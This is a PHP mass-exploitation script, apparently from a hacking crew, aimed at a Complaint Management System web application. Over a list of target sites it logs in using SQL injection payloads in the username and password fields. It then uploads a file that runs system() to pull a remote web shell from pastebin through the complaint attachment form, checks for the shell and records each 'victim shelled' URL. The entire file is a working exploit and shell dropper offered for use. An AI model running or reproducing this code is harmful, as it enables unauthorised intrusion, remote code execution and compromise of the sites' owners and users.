<?php
error_reporting(0);
	// coded by s4dness
	// Ghost Riddiculous Team
	// usage: php file.php list=list.txt
	
class ComplaintManagementSystem {
	public  $r = "\033[0;31m",
			$g = "\033[0;32m",
			$b = "\033[0;34m",
			$w = "\033[1;37m";
	
	public function __construct()
	{
		$list = explode("\n", file_get_contents(@$_GET["list"]));
		foreach($list as $u) {
			echo "{$this->b} [info] $u\n{$this->w}";
			$this->login($u);
		}
	}
	
	public function curl($url, $post)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_TIMEOUT, 7);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_COOKIEJAR, "session_log");
		curl_setopt($ch, CURLOPT_COOKIEFILE, "session_log");
		$x = curl_exec($ch);
		return [
			"head" => curl_getinfo($ch, CURLINFO_HTTP_CODE),
			"body" => $x
		];
	}
	
	public function login($u) 
	{
		$login = $this->curl("$u/users/index.php", [
			"username" => "s4dness' or '1'='1'#",
			"password"  => "s4dness' or '1'='1'#",
			"submit" => ""
		]);
		if($login["head"] == 200) {
			echo "{$this->g}    [+] login successfully!\n{$this->w}";
			$this->exploit($u);
		} else echo "{$this->r}    [-] login failed!\n{$this->w}";
	}
	
	public function exploit($u)
	{
		$f = fopen("xhell.php", "w");
		fwrite($f, "<?php system('curl -o s4dness.php https://pastebin.com/raw/ECstNap8');?>");
		fclose($f);
		
		echo "{$this->g}    [+] shelling victim\n{$this->w}";
		$this->curl("$u/users/register-complaint.php", [
			"category" => "1",
			"subcategory" => "Online Shopping",
			"complaintype" => " Complaint",
			"state" => "Punjab",
			"noc" => "the end",
			"complaindetails" => "the end",
			"compfile" => "xhell.php",
			"submit" => ""
		]);
		$this->check($u);
	}
	
	public function check($u)
	{
		$shell = $u . "/users/complaintdocs/s4dness.php";
		$ch = curl_init($shell);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		$x = curl_exec($ch);
		
		if(preg_match("/Shell/", $x)) {
			echo "{$this->g}    [+] victim shelled\n";
			echo "    [+] $shell\n\n{$this->w}";
			system("echo $shell >> s4dness.txt");
		} else echo "{$this->b}    [-] shelling failed, try manual.\n\n{$this->w}";
	}
}
	parse_str(implode("&", array_slice($argv, 1)), $_GET);
	if(empty(@$_GET["list"])) {
		die("  usage: php $argv[0] list=list.txt\n");
	} elseif(!file_exists(@$_GET["list"])) {
		die("  file not found\n");
	}
	system("clear");
	$banner = "\n\n\033[0;31m___ _ __ ___  ___       _ __ ___ ___
 / __| '_ ` _ \/ __|_____| '__/ __/ _ \
| (__| | | | | \__ \_____| | | (_|  __/
 \___|_| |_| |_|___/     |_|  \___\___| v.4.0
 	coded by s4dness
 	Ghost Riddiculous Team\033[1;37m
 ";
	echo $banner . "\n\n";
	new ComplaintManagementSystem();